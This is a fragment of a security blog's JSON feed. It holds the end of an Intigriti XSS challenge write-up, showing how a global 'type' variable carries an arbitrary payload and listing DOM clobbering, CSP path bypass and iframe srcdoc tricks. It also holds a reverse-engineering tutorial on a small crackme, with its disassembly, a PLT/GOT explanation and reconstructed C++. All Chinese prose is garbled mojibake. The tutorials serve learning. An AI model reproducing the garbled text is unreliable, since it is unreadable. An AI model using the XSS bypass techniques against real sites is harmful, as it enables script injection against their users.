åœ¨å…¶ä»–ç¶²é ä¸­ã€é€™å€‹æ˜¯æˆ‘å¾ˆå¸¸å¿˜è¨˜çš„ä¸€å€‹æ–¹æ³•ã€‚</p>\n<p>å¦ä¸€å€‹éé æœŸçš„è§£æ³•ä¹Ÿå¾ˆç¥å¥‡ï¼Œæ˜¯æ ¹æ“šé€™ä¸€æ®µï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">case</span> <span class=\"token string\">\"log\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[log]: \"</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">,</span> type<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">.</span>type<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>  <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>é€™ä¸€æ®µçš„é‡é»æ˜¯ <code>type=e.data.message.type</code>ï¼Œæœƒè¨­ç½®ä¸€å€‹ global variable å«åš typeï¼Œå› æ­¤å…¶å¯¦å¯ä»¥é€éé€™é‚Šå‚³å…¥ä»»æ„ payloadï¼Œå†å»å‘¼å« logv å°±å¥½ã€‚å°±çœå»äº†æŠŠ payload æ”¾åœ¨ a ä¸Šé¢é‚£ä¸€å¤§å †è¦è™•ç†çš„äº‹æƒ…ã€‚</p>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> ç¸½çµ</h2>\n<p>æˆ‘æ»¿å–œæ­¡é€™æ¬¡çš„é€™å€‹é¡Œç›®ï¼Œå› ç‚ºæœ‰ç¨®å±¤å±¤é—œå¡çš„æ„Ÿè¦ºï¼Œä¸€é—œä¸€é—œæ…¢æ…¢éï¼Œæ¯ç•¶æˆ‘ä»¥ç‚ºè¦ç ´é—œçš„æ™‚å€™ï¼Œå°±åˆå¡ä½äº†ï¼Œç›´åˆ°æœ€å¾Œæ‰æŠŠæ‰€æœ‰é—œå¡éƒ½è§£å®Œï¼ŒæˆåŠŸåŸ·è¡Œ XSSã€‚</p>\n<p>å¾é€™å€‹æŒ‘æˆ°ä¸­ï¼Œå¯ä»¥å­¸ç¿’åˆ°çš„å‰ç«¯çŸ¥è­˜æ˜¯ï¼š</p>\n<ol>\n<li>DOM clobbering</li>\n<li>JS çš„è¨»è§£ä¸æ˜¯åªæœ‰ // è·Ÿ /* */</li>\n<li>CSP é‡å° path çš„ç¹é</li>\n<li>ç”¨ innerHTML æ–°å¢çš„ script ä¸æœƒåŸ·è¡Œ</li>\n<li>é‡å°ä¸Šä¸€é»ï¼Œå¯ä»¥ç”¨ iframe srcdoc ä¾†ç¹éï¼ˆä½†ä¸€èˆ¬ç‹€æ³ä¸‹æ‡‰è©²æ–°å¢ä¸€å€‹ script tag ç„¶å¾Œ appendï¼‰</li>\n</ol>\n<p>å¾é€™å€‹é¡Œç›®ä¸­å¯ä»¥å­¸ç¿’æˆ–æ˜¯è¤‡ç¿’æ»¿å¤šæŠ€å·§çš„ï¼ŒCTF è·Ÿé€™ç¨®æŒ‘æˆ°æœ‰è¶£çš„é»å°±åœ¨é€™é‚Šï¼Œé›–ç„¶èªªæ¯æ¨£æ±è¥¿æ‹†é–‹ä¾†å¯èƒ½éƒ½çŸ¥é“ï¼Œä½†è¦æ€éº¼ç²¾å¿ƒä¸²èµ·ä¾†ï¼Œæ˜¯å¾ˆè€ƒé©—ç¶“é©—è·ŸåŠŸåŠ›çš„ã€‚</p>\n<p>å¦‚æœå° XSS æŒ‘æˆ°æœ‰èˆˆè¶£ï¼Œå¯ä»¥é—œæ³¨ <a href=\"https://twitter.com/intigriti\">Intigriti</a> ä¸¦ä¸”ç­‰å¾…ä¸‹ä¸€æ¬¡çš„æŒ‘æˆ°ã€‚</p>\n",
      "date_published": "2021-08-05T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/crystal/reverse-02/",
      "url": "https://tech-blog.cymetrics.io/posts/crystal/reverse-02/",
      "title": "Reverse Engineering 101 â€” Part 2",
      "content_html": "<!-- summary -->\n<!-- é€†å‘å°ç™½å¸¶è‘—æ»¿ç®±çš„çŸ¥è­˜ï¼Œæº–å‚™æ­£å¼é–‹å§‹æ‹†è§£å°ç¨‹å¼å•¦ï¼ -->\n<!-- summary -->\n<p>part 1 å‚³é€é–€ï¼š<a href=\"https://tech-blog.cymetrics.io/posts/crystal/reverse-01\"><strong>Reverse Engineering 101â€Šâ€”â€ŠPart 1</strong></a></p>\n<p>ç†¬éäº†åŸºç¤çŸ¥è­˜çš„å»ºç«‹ï¼Œæ¥ä¸‹ä¾†æˆ‘å€‘ä¾†åˆ†æä¸€ä¸‹ç¨‹å¼çš„é‚è¼¯å§ï¼</p>\n<h2 id=\"%E4%BA%8B%E4%B8%8D%E5%AE%9C%E9%81%B2%EF%BC%8C%E5%BF%AB%E5%BF%AB%E9%96%8B%E5%A7%8B\"><a class=\"direct-link\" href=\"#%E4%BA%8B%E4%B8%8D%E5%AE%9C%E9%81%B2%EF%BC%8C%E5%BF%AB%E5%BF%AB%E9%96%8B%E5%A7%8B\">#</a> äº‹ä¸å®œé²ï¼Œå¿«å¿«é–‹å§‹</h2>\n<p>é¦–å…ˆå…ˆçµ¦å¤§å®¶çœ‹ä¸€ä¸‹ <code>disas main</code> çš„å®Œæ•´çµæœã€‚</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">Dump of assembler code for function main:<br>   0x0000000000400b1e &lt;+0>:\t    push   rbp<br>   0x0000000000400b1f &lt;+1>:\t    mov    rbp,rsp<br>   0x0000000000400b22 &lt;+4>:\t    sub    rsp,0x20<br>   0x0000000000400b26 &lt;+8>:\t    mov    DWORD PTR [rbp-0xc],0x0<br>   0x0000000000400b2d &lt;+15>:\tmov    DWORD PTR [rbp-0x10],0x0<br>   0x0000000000400b34 &lt;+22>:\tmov    DWORD PTR [rbp-0x14],0x0<br>   0x0000000000400b3b &lt;+29>:\tmov    esi,0x400cd0<br>   0x0000000000400b40 &lt;+34>:\tmov    edi,0x6021a0<br>   0x0000000000400b45 &lt;+39>:\tcall   0x400830 &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt><br>   0x0000000000400b4a &lt;+44>:\tlea    rax,[rbp-0xc]<br>   0x0000000000400b4e &lt;+48>:\tmov    rsi,rax<br>   0x0000000000400b51 &lt;+51>:\tmov    edi,0x602080<br>   0x0000000000400b56 &lt;+56>:\tcall   0x400850 &lt;_ZNSirsERi@plt><br>   0x0000000000400b5b &lt;+61>:\tlea    rdx,[rbp-0x10]<br>   0x0000000000400b5f &lt;+65>:\tmov    rsi,rdx<br>   0x0000000000400b62 &lt;+68>:\tmov    rdi,rax<br>   0x0000000000400b65 &lt;+71>:\tcall   0x400850 &lt;_ZNSirsERi@plt><br>   0x0000000000400b6a &lt;+76>:\tlea    rdx,[rbp-0x14]<br>   0x0000000000400b6e &lt;+80>:\tmov    rsi,rdx<br>   0x0000000000400b71 &lt;+83>:\tmov    rdi,rax<br>   0x0000000000400b74 &lt;+86>:\tcall   0x400850 &lt;_ZNSirsERi@plt><br>   0x0000000000400b79 &lt;+91>:\tmov    edx,DWORD PTR [rbp-0xc]<br>   0x0000000000400b7c &lt;+94>:\tmov    eax,DWORD PTR [rbp-0x10]<br>   0x0000000000400b7f &lt;+97>:\tadd    edx,eax<br>   0x0000000000400b81 &lt;+99>:\tmov    eax,DWORD PTR [rbp-0x14]<br>   0x0000000000400b84 &lt;+102>:\tadd    eax,edx<br>   0x0000000000400b86 &lt;+104>:\tmov    edi,eax<br>   0x0000000000400b88 &lt;+106>:\tcall   0x40094d &lt;_Z3geni><br>   0x0000000000400b8d &lt;+111>:\tmov    QWORD PTR [rbp-0x8],rax<br>   0x0000000000400b91 &lt;+115>:\tmov    edx,DWORD PTR [rbp-0xc]<br>   0x0000000000400b94 &lt;+118>:\tmov    eax,DWORD PTR [rbp-0x10]<br>   0x0000000000400b97 &lt;+121>:\tadd    edx,eax<br>   0x0000000000400b99 &lt;+123>:\tmov    eax,DWORD PTR [rbp-0x14]<br>   0x0000000000400b9c &lt;+126>:\tadd    eax,edx<br>   0x0000000000400b9e &lt;+128>:\tcmp    eax,0x539<br>   0x0000000000400ba3 &lt;+133>:\tjne    0x400bcc &lt;main+174><br>   0x0000000000400ba5 &lt;+135>:\tmov    esi,0x400ce6<br>   0x0000000000400baa &lt;+140>:\tmov    edi,0x6021a0<br>   0x0000000000400baf &lt;+145>:\tcall   0x400830 &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt><br>   0x0000000000400bb4 &lt;+150>:\tmov    rax,QWORD PTR [rbp-0x8]<br>   0x0000000000400bb8 &lt;+154>:\tmov    rdi,rax<br>   0x0000000000400bbb &lt;+157>:\tcall   0x400ae3 &lt;_Z9print_ptrPc><br>   0x0000000000400bc0 &lt;+162>:\tmov    edi,0x400cef<br>   0x0000000000400bc5 &lt;+167>:\tcall   0x4007c0 &lt;puts@plt><br>   0x0000000000400bca &lt;+172>:\tjmp    0x400bdb &lt;main+189><br>   0x0000000000400bcc &lt;+174>:\tmov    esi,0x400cf1<br>   0x0000000000400bd1 &lt;+179>:\tmov    edi,0x6021a0<br>   0x0000000000400bd6 &lt;+184>:\tcall   0x400830 &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt><br>   0x0000000000400bdb &lt;+189>:\tmov    rax,QWORD PTR [rbp-0x8]<br>   0x0000000000400bdf &lt;+193>:\tmov    rdi,rax<br>   0x0000000000400be2 &lt;+196>:\tcall   0x400840 &lt;free@plt><br>   0x0000000000400be7 &lt;+201>:\tmov    eax,0x0<br>   0x0000000000400bec &lt;+206>:\tleave  <br>   0x0000000000400bed &lt;+207>:\tret    <br>End of assembler dump.</code></pre>\n<p>å“‡ï¼Œé€™äº›å¯†å¯†éº»éº»çš„æ€éº¼çœ‹ï¼Ÿï¼å¾ç¬¬ä¸€è¡Œé–‹å§‹è®€å—ï¼Ÿ</p>\n<blockquote>\n<p>é¦–å…ˆï¼Œæœ€é‡è¦çš„æ˜¯ç†å‡ºé‚è¼¯ï¼Œä¹Ÿå°±æ˜¯è¦è¾¨åˆ¥ã€ç”¨äº†å“ªäº›å‡½æ•¸ã€è·Ÿã€ç¶“éå“ªäº›åˆ¤æ–·å¼ã€ã€‚</p>\n</blockquote>\n<p>ã€ç”¨äº†å“ªäº›å‡½æ•¸ã€ç°¡å–®ï¼Œåªè¦æ‰¾å‡ºæ‰€æœ‰çš„ <code>call</code> æŒ‡ä»¤å°±è¡Œäº†ã€‚ä¸Šé¢ç”¨åˆ°çš„å°±æœ‰å¥½å¹¾å€‹ï¼Œä¾‹å¦‚å¥½çŸ­çš„ <code>&lt;_Z3geni&gt;</code> <code>&lt;puts@plt&gt;</code>è·Ÿé€™å€‹å¥½é•·çš„<code>&lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&gt;</code>ã€‚æœ‰äººå¯èƒ½æœƒç™¼ç¾ï¼Œæ€éº¼æœ‰äº›å‡½æ•¸å¾Œé¢åŠ äº†ä¸€å€‹ <code>@plt</code> å‘¢ï¼Ÿ</p>\n<p>é€™è£¡è¦å…ˆè¬›ã€å‡½æ•¸ã€æ˜¯æ€éº¼è¢«å„²å­˜è·Ÿå­˜å–çš„ã€‚å¯«éä¸€é»ç¨‹å¼çš„äººæ‡‰è©²éƒ½ç”¨éä¸€äº› standard library æˆ–æ˜¯ç¬¬ä¸‰æ–¹å‡½å¼åº«ï¼Œæœ‰æ²’æœ‰æƒ³éç¨‹å¼åŸ·è¡Œèµ·ä¾†çš„æ™‚å€™æ€éº¼æŠ“åˆ°æˆ–å¼•ç”¨é€™äº›å¤–éƒ¨å‡½æ•¸å‘¢ï¼Ÿ</p>\n<h3 id=\"linking\"><a class=\"direct-link\" href=\"#linking\">#</a> Linking</h3>\n<p>åœ¨ç·¨è­¯ç¨‹å¼ç¢¼çš„æ™‚å€™ï¼Œæœ‰ dynamic linking å’Œ static linking å…©ç¨®æ–¹æ³•ï¼Œç°¡å–®å°æ¯”çš„è©±ï¼Œdynamic linking å°±æ˜¯åªæŠŠä½œè€…è‡ªå·±å®šç¾©çš„å‡½æ•¸è·Ÿé‚è¼¯åŒ…é€²åŸ·è¡Œæª”ï¼Œè€Œ static linking å‰‡æœƒæŠŠå¤–éƒ¨å¼•ç”¨çš„å‡½æ•¸ä¸€èµ·åŒ…é€²å»ã€‚æ‰€ä»¥ static linking ç”¢ç”Ÿçš„æª”æ¡ˆæœƒå¤§å¾ˆå¤šï¼Œè€Œ dynamic linking å‰‡æœƒéœ€è¦æª”æ¡ˆåŸ·è¡Œè€…æœ¬æ©Ÿä¸Šçš„å‡½ç¤ºåº«æ”¯æ´ã€‚åˆ°äº†åŸ·è¡Œçš„æ™‚å€™ï¼Œstatically linked çš„æª”æ¡ˆå°±å¯ä»¥ç›´æ¥åœ¨åŸ·è¡Œæª”è£¡æ‰¾åˆ°å‡½æ•¸ï¼Œdynamically linked å‰‡æ˜¯åœ¨ç¨‹å¼è·‘èµ·ä¾†çš„æ™‚å€™ï¼Œä½œæ¥­ç³»çµ±æ‰æœƒåš linkingï¼ŒæŠŠå„å€‹è¦èª¿ç”¨çš„å¤–éƒ¨å‡½æ•¸çš„ä½ç½®å¡«åˆ°é€™éš»ç¨‹å¼çš„ä¸€å¼µè¡¨è£¡ï¼Œæ–¹ä¾¿åŸ·è¡Œæ™‚æŸ¥è©¢å‘¼å«ã€‚å‰›å‰›èªªè¦ã€å¡«å…¥çš„ä¸€å¼µè¡¨ã€å°±æ˜¯ GOTï¼ˆGlobal Offsets Tableï¼‰ï¼Œæ˜¯ä¸€å€‹å¯è®€å¯å¯«çš„è¨˜æ†¶é«”ç©ºé–“ï¼›è€Œ PLTï¼ˆProcedure Linkage Tableï¼‰å°±æ˜¯ã€åŸ·è¡Œæ™‚æŸ¥è©¢å‘¼å«ã€çš„å¦ä¸€å¼µè¡¨ï¼Œæ˜¯ä¸€å€‹å¯è®€å¯åŸ·è¡Œçš„è¨˜æ†¶é«”ç©ºé–“ã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-02/plt-got.png\" /><figcaption><p>GOT PLT table</p>\n</figcaption></figure></p>\n<p>æˆ‘å€‘ç”¨ä¸Šé¢é€™å¼µåœ–ç°¡å–®èªªæ˜ä¸€ä¸‹ã€‚</p>\n<p>ç•¶ç¨‹å¼è·‘èµ·ä¾†æ™‚ï¼Œdynamic linker æœƒåšå¹¾ä»¶äº‹ï¼š</p>\n<ol>\n<li>æŠŠå¼•ç”¨åˆ°çš„å¤–éƒ¨æª”æ¡ˆ load åˆ° memory</li>\n<li>å‰µå»º PLT èˆ‡ GOTï¼ŒPLT ä¸­çš„æ¬„ä½æŒ‡å‘å°æ‡‰çš„ GOT æ¬„ä½</li>\n<li>åœ¨ GOT æ¬„ä½ä¸­æ”¾å…¥ä¸€å€‹ default stubï¼ˆå¯ä»¥å…ˆæƒ³æˆæ˜¯ä¸€å€‹æ©Ÿé—œï¼‰ã€‚</li>\n</ol>\n<p>ç¬¬ä¸€æ¬¡é‡åˆ° <code>call func@plt</code> çš„æŒ‡ä»¤æ™‚ï¼Œç¨‹å¼å°±æœƒæˆ³åˆ° GOT æ¬„ä½è£¡çš„ default stubï¼Œè§¸ç™¼æ©Ÿé—œä½¿ dynamic linker ä¾æ“šå‰›å‰› load é€²ä¾†çš„å‡½å¼åº«è·Ÿ <code>func</code> åœ¨å¤–éƒ¨æª”æ¡ˆä¸­çš„ offset ç®—å‡ºæ­¤æ™‚ <code>func</code> åœ¨è¨˜æ†¶é«”ä¸­çš„ä½ç½®ä¸¦ä¸”å¡«å…¥è¡¨ä¸­ï¼Œè®Šæˆä¸‹é¢é‚£å¼µåœ–çš„æ¨£å­ã€‚æ­¤å¾Œï¼Œä»»ä½•çš„ <code>call func@plt</code> æŒ‡ä»¤å°±æœƒé †åˆ©å‘¼å«åˆ° <code>0x7fff12b0</code> é€™å€‹ä½ç½®çš„å‡½æ•¸å•¦ï¼</p>\n<p>ä»¥ä¸Šæ˜¯ä¸€å€‹éå¸¸ç°¡ç•¥çš„ä»‹ç´¹ï¼Œå…¶å¯¦ linker çš„æ©Ÿåˆ¶é‚„æœ‰éå¸¸å¤šç´°ç¯€ï¼Œæœ‰èˆˆè¶£çš„å¯ä»¥åƒè€ƒå¤§ä½¬ <a href=\"https://www.airs.com/blog/archives/41\">Ian Lance Taylor çš„ä¸€ç³»åˆ—æ–‡ç« </a>ã€‚</p>\n<p>ä¸éç¶“éé€™å€‹ç°¡ç•¥çš„ä»‹ç´¹ï¼Œå¤§å®¶å¯ä»¥è¨˜å¾—å…©ä»¶äº‹ï¼š</p>\n<ul>\n<li>GOT å¯å¯«ï¼ŒPLT å¯åŸ·è¡Œ</li>\n<li>é€šå¸¸ç”¨ <code>@plt</code> å‘¼å«çš„æŒ‡ä»¤æ˜¯å¤–éƒ¨å‡½æ•¸ï¼Œå¸¸å¸¸æ˜¯æ¨™æº–å‡½å¼åº«ï¼Œçœ‹ä¸æ‡‚å¯ä»¥ç›´æ¥ google æŸ¥è©¢ï¼Œéƒ½æ‰¾å¾—åˆ°è©³ç›¡çš„æ–‡ä»¶</li>\n</ul>\n<h3 id=\"function-calls\"><a class=\"direct-link\" href=\"#function-calls\">#</a> Function calls</h3>\n<p>å¥½çš„ï¼Œé‚£ä¸Šé¢ <code>main</code>çš„å‡½æ•¸æœ‰å“ªäº›å‘¢ï¼Ÿåˆæ˜¯ä»€éº¼æ„æ€å‘¢ï¼Ÿå¹«ä½ æŸ¥å¥½äº†ï¼</p>\n<ul>\n<li><code>_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt</code>ï¼šbasic <code>ostream</code>ï¼Œä¹Ÿå°±æ˜¯ <code>cout</code> ç”¨åˆ°çš„ <code>&lt;&lt;</code></li>\n<li><code>_ZNSirsERi@plt</code>ï¼š<code>istream</code>ï¼Œä¹Ÿå°±æ˜¯ <code>cin</code> ç”¨åˆ°çš„<code>&gt;&gt;</code></li>\n<li><code>_Z3geni</code>ï¼šä½œè€…è‡ªå®šç¾©çš„å‡½æ•¸ï¼Œçœ‹èµ·ä¾†æœ¬ä¾†æ˜¯ <code>gen()</code>ï¼Œæ‡‰è©²æ˜¯ç”¨ä¾†ç”¢ç”Ÿ flag çš„å‡½æ•¸</li>\n<li><code>_Z9print_ptrPc</code>ï¼šä½œè€…è‡ªå®šç¾©çš„å‡½æ•¸ï¼Œçœ‹èµ·ä¾†æœ¬ä¾†æ˜¯ <code>print_ptr()</code>ï¼Œæ‡‰è©²æ˜¯å°å‡ºæŸäº›æ±è¥¿</li>\n<li><code>puts@plt</code>ï¼šlibc <code>put</code> function</li>\n<li><code>free@plt</code>ï¼šlibc <code>free</code> function</li>\n</ul>\n<p>å°æç¤ºï¼šåˆ¤åˆ¥å‡½æ•¸é™¤äº†æŸ¥è©¢ä¹‹å¤–ï¼Œä¹Ÿå¯ä»¥å¾å‰›å‰›çš„ assembly çœ‹å‡ºä¸€é»ç«¯å€ªï¼æˆ‘å€‘çŸ¥é“å‡½æ•¸æ¥æ”¶åƒæ•¸æ˜¯ç”¨ <code>rdi</code> <code>rsi</code> ï¼Œé‚£å°±å¯ä»¥æŠŠä¸€äº›å·²çŸ¥ä½ç½®çš„è¨˜æ†¶é«”å°å‡ºä¾†ã€‚</p>\n<p>ä¾‹å¦‚ <code>main+39</code> çš„ <code>_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc</code> å‰é¢æ˜¯ <code>mov esi,0x400cd0; mov edi,0x6021a0</code>ï¼Œ <code>main+56</code> çš„ <code>_ZNSirsERi</code> å‰é¢æ˜¯ <code>mov edi,0x602080</code>ï¼š</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-02/cin-cout.png\" /><figcaption><p>cin cout</p>\n</figcaption></figure></p>\n<p>æœ€å¾Œ <code>main+145</code> çš„ <code>_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc</code> å‰é¢æ˜¯ <code>mov esi,0x400ce6; mov edi,0x6021a0</code>ï¼Œ <code>main+167</code> çš„ <code>puts@plt</code> å‰é¢æ˜¯ <code>mov edi,0x400cef</code>ï¼š</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-02/flag-cout.png\" /><figcaption><p>print flag</p>\n</figcaption></figure></p>\n<p>æ¨™æº–å‡½å¼åº«çš„åƒæ•¸éƒ½å¯ä»¥åœ¨æ–‡ä»¶ä¸ŠæŸ¥åˆ°ï¼Œåªè¦å°æ‡‰è‘—å‰ä¸€ç¯‡æéçš„ register çš„é †åºå°±å¯ä»¥æ¨æ•²å‡ºæ¯å¡Šè³‡æ–™çš„æ„ç¾©äº†å–”ï¼</p>\n<h3 id=\"conditionals\"><a class=\"direct-link\" href=\"#conditionals\">#</a> Conditionals</h3>\n<p>å†ä¾†åˆ¤åˆ¥ç¨‹å¼çš„é‚è¼¯ï¼Œæœ€é‡è¦çš„å°±æ˜¯æ‰¾å‡º <code>cmp</code> æŒ‡ä»¤ä¸¦å›æ¨å¿…è¦çš„æ¢ä»¶ã€‚ä»¥ä¸‹ç¯€éŒ„åˆ¤æ–·é‚è¼¯ï¼Œçœç•¥çš„éƒ¨åˆ†è·Ÿå‡½æ•¸å‘¼å«æˆ‘ç”¨è¨»è§£å¯«ä¸Šä»–å€‘çš„åŠŸèƒ½ã€‚</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">Dump of assembler code for function main:<br>   .....snip...... # setup and print prompt  <br>   0x0000000000400b4a &lt;+44>:\tlea    rax,[rbp-0xc]<br>   0x0000000000400b4e &lt;+48>:\tmov    rsi,rax<br>   0x0000000000400b51 &lt;+51>:\tmov    edi,0x602080<br>   0x0000000000400b56 &lt;+56>:\tcall   0x400850 &lt;_ZNSirsERi@plt>    # cin to [rbp-0xc] <br>   0x0000000000400b5b &lt;+61>:\tlea    rdx,[rbp-0x10]<br>   0x0000000000400b5f &lt;+65>:\tmov    rsi,rdx<br>   0x0000000000400b62 &lt;+68>:\tmov    rdi,rax<br>   0x0000000000400b65 &lt;+71>:\tcall   0x400850 &lt;_ZNSirsERi@plt>    # cin to [rbp-0x10]<br>   0x0000000000400b6a &lt;+76>:\tlea    rdx,[rbp-0x14]<br>   0x0000000000400b6e &lt;+80>:\tmov    rsi,rdx<br>   0x0000000000400b71 &lt;+83>:\tmov    rdi,rax<br>   0x0000000000400b74 &lt;+86>:\tcall   0x400850 &lt;_ZNSirsERi@plt>    # cin to [rbp-0x14]<br>   .....snip...... # generate something from input<br>   0x0000000000400b91 &lt;+115>:\tmov    edx,DWORD PTR [rbp-0xc]<br>   0x0000000000400b94 &lt;+118>:\tmov    eax,DWORD PTR [rbp-0x10]<br>   0x0000000000400b97 &lt;+121>:\tadd    edx,eax<br>   0x0000000000400b99 &lt;+123>:\tmov    eax,DWORD PTR [rbp-0x14]<br>   0x0000000000400b9c &lt;+126>:\tadd    eax,edx<br>   0x0000000000400b9e &lt;+128>:\tcmp    eax,0x539                    # compare to 1337!<br>   0x0000000000400ba3 &lt;+133>:\tjne    0x400bcc &lt;main+174><br>   .....snip...... # success, print flag<br>   0x0000000000400bcc &lt;+174>:\tmov    esi,0x400cf1                 # 'nope.'<br>   0x0000000000400bd1 &lt;+179>:\tmov    edi,0x6021a0<br>   0x0000000000400bd6 &lt;+184>:\tcall   0x400830 &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt><br>   .....snip...... # clean up, free buffer<br>   0x0000000000400bec &lt;+206>:\tleave  <br>   0x0000000000400bed &lt;+207>:\tret  </code></pre>\n<p>é¦–å…ˆæ³¨æ„åˆ° <code>main+128</code> çš„ <code>cmp eax,0x539</code>ã€‚</p>\n<p>ä¸‹ä¸€è¡Œçš„ <code>jne 0x400bcc &lt;main+174&gt;</code> å‘Šè¨´æˆ‘å€‘ï¼Œå¦‚æœ <code>eax</code> çš„å€¼ä¸æ˜¯ 1337ï¼ˆæŠŠåå…­é€²ä½è½‰æˆåé€²ä½ï¼‰ï¼Œé‚£é‚è¼¯å°±æœƒè·³åˆ° <code>main+174</code>ï¼Œä¹Ÿå°±æ˜¯å°å‡ºå¤±æ•—å­—ä¸² â€œnope.â€ çš„åœ°æ–¹ï¼Œæ‰€ä»¥æˆ‘å€‘çš„ç›®æ¨™æ˜¯è®“ï¼š<code>eax=1337</code>ã€‚</p>\n<p>å¾€å›æ¨ï¼Œ<code>eax=eax+edx (main+126)</code>ï¼Œåˆæœ¬ä¾†çš„ <code>eax=[rbp-0x14] (main+123)</code>ã€æœ¬ä¾†çš„<code>edx=edx+eax=[rbp-0xc]+[rbp-0x10] (main+115~121)</code>ï¼Œä¹Ÿå°±æ˜¯èªªï¼Œæœ€å¾Œ <code>eax</code> çš„å€¼å…¶å¯¦å°±æ˜¯ <code>[rbp-0x14]+[rbp-0xc]+[rbp-0x10]</code>ã€‚</p>\n<p>é‚£é€™ä¸‰å€‹è¨˜æ†¶é«”åˆæ˜¯å“ªä¾†çš„å‘¢ï¼Ÿ</p>\n<p>å†å¾€å‰çœ‹ä¸€äº›ä½ å°±æœƒç™¼ç¾ï¼Œé€™ä¸‰å¡Šå…¶å¯¦å°±æ˜¯ <code>cin</code> åƒé€²ä¾†çš„ä¸‰å€‹æ•¸å­—ï¼Œä¹Ÿå°±æ˜¯æˆ‘å€‘ä¸€é–‹å§‹è¼¸å…¥çš„å€¼å‘€ï¼å¾€ä¸Šçœ‹åˆ°ä¸€é€²å…¥ <code>main</code> çš„å‰å¹¾è¡Œï¼Œæœ‰æŠŠé€™ä¸‰å¡Šè¨˜æ†¶é«”æ¸…ç©ºçš„æŒ‡ä»¤ï¼Œå…¶å¯¦å°±æ˜¯æŠŠé€™ä¸‰å€‹ 4 byte å¤§å°çš„ int å€åŸŸè®Šæ•¸åˆå§‹åŒ–ç‚º 0 çš„èˆ‰å‹•ã€‚</p>\n<p>å…¶å¯¦åˆ°é€™è£¡ï¼Œé€™ä¸€é¡Œå°±å·²ç¶“è§£å®Œäº†ã€‚æˆ‘å€‘åªè¦è¼¸å…¥ä»»æ„ä¸‰å€‹ç›¸åŠ ç‚º 1337 çš„æ•¸å­—å°±å¯ä»¥æˆåŠŸæ‹¿åˆ° flag äº†ï¼</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-02/reversed.png\" /><figcaption><p>reversed</p>\n</figcaption></figure></p>\n<p>æ ¹æ“šä¸Šé¢çš„åˆ†æï¼Œæˆ‘å€‘å¯ä»¥æ‰‹å‹•é‚„åŸ <code>main</code>çš„ cpp codeã€‚å»ºè­°ä½ å¯ä»¥å…ˆè‡ªå·±è©¦è©¦çœ‹ï¼Œç·´ç¿’å®Œå†ä¾†çœ‹ä¸‹é¢é€™æ®µï¼</p>\n<pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">int</span> a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">,</span>c <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> flag<span class=\"token punctuation\">;</span><br>    std<span class=\"token double-colon punctuation\">::</span>cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"Enter three numbers!\"</span> <span class=\"token operator\">&lt;&lt;</span> std<span class=\"token double-colon punctuation\">::</span>endl<span class=\"token punctuation\">;</span><br>    std<span class=\"token double-colon punctuation\">::</span>cin <span class=\"token operator\">>></span> a <span class=\"token operator\">>></span> b <span class=\"token operator\">>></span> c <span class=\"token punctuation\">;</span><br>    a <span class=\"token operator\">=</span> a <span class=\"token operator\">+</span> b<span class=\"token punctuation\">;</span><br>    a <span class=\"token operator\">=</span> a <span class=\"token operator\">+</span> c<span class=\"token punctuation\">;</span><br><br>    flag <span class=\"token operator\">=</span> <span class=\"token function\">gen</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>a <span class=\"token operator\">==</span> <span class=\"token number\">1337</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>        std<span class=\"token double-colon punctuation\">::</span>cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"FLAG{\"</span> <span class=\"token punctuation\">;</span><br>        <span class=\"token function\">print_ptr</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        std<span class=\"token double-colon punctuation\">::</span>cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"}\"</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<h3 id=\"that%E2%80%99s-it%3F\"><a class=\"direct-link\" href=\"#that%E2%80%99s-it%3F\">#</a> Thatâ€™s 